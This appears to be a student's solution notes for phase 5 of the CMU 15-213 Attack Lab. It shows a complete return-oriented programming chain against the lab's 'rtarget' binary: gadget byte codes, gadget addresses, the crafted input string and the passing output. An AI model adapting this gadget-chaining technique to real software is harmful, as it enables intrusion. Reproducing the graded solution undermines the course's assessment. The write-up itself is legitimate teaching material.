@@ -1,0 +1,100 @@
+Command and output:
+$ ./hex2raw < rtarget_input_p5.txt > rtarget_input_hex.txt
+$ ./rtarget -q -i rtarget_input_hex.txt
+Cookie: 0x59b997fa
+Touch3!: You called touch3("59b997fa")
+Valid solution for level 3 with target rtarget
+PASS: Would have posted the following:
+	user id	bovik
+	course	15213-f15
+	lab	attacklab
+	result	1:PASS:0xffffffff:rtarget:3:01 02 03 04 05 06 07 08 09 10 01 02 03 04 05 06 07 08 09 20 01 02 03 04 05 06 07 08 09 30 01 02 03 04 05 06 07 08 09 40 06 1A 40 00 00 00 00 00 C5 19 40 00 00 00 00 00 AB 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 70 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00
+
+1) The hex value of cookie string
+"59b997fa" -> 0x35 39 62 39 39 37 66 61 00
+(don't forget the end null)
+
+2) Because stack positions are randomized, we need to
+denote the cookie string address in terms of relative
+position with the stack top.
+
+3) Assembly codes:
+movq %rsp, %rax
+ret
+
+(Byte codes)
+48 89 e0
+c3
+(gadget address: 0x401a06)
+
+movq %rax, %rdi
+nop
+ret
+
+(Byte codes)
+48 89 c7
+90
+c3
+(gadget address: 0x4019c5)
+
+popq %rax # Push the relative distance between cookie string value and stack top to the register
+nop
+ret
+
+(Byte codes)
+58
+90
+c3
+(gadget address: 0x4019ab)
+
+movl %eax, %edx
+nop
+ret
+(Byte codes)
+89 c2
+90
+c3
+(gadget address: 0x4019dd)
+
+movl %edx, %ecx
+ret
+(Byte codes)
+89 d1
+c3
+(gadget address: 0x401a70)
+
+movl %ecx, %esi
+ret
+(Byte codes)
+89 ce
+c3
+(gadget address: 0x401a13)
+
+lea (%rdi, %rsi, 1), %rax
+ret
+(Byte codes)
+48 8d 04 37
+c3
+(gadget address: 0x4019d6)
+
+movq %rax, %rdi
+ret
+(Byte codes)
+48 89 c7
+c3
+(gadget address: 0x4019a2)
+
+4) Construct the input string:
+Dummy 40 bytes
++ gadget address: 0x401a06 (augment to 8 bytes) "06 1a 40 00..."
++ gadget address: 0x4019c5 (augment to 8 bytes) "c5 19 40 00..."
++ gadget address: 0x4019ab (augment to 8 bytes) "ab 19 40 00..."
++ cookie string relative depth to stack top: 9 * 8 = 72 = 0x48(augment to 8 bytes)
++ gadget address: 0x4019dd (augment to 8 bytes) "dd 19 40 00..."
++ gadget address: 0x401a70 (augment to 8 bytes) "70 1a 40 00..."
++ gadget address: 0x401a13 (augment to 8 bytes) "13 1a 40 00..."
++ gadget address: 0x4019d6 (augment to 8 bytes) "d6 19 40 00..."
++ gadget address: 0x4019a2 (augment to 8 bytes) "a2 19 40 00..."
++ touch3 address: 0x4018fa (augment to 8 bytes) "fa 18 40 00..."
++ cookie string value: "59b997fa" -> 0x35 39 62 39 39 37 66 61 00
+(don't forget the end null)
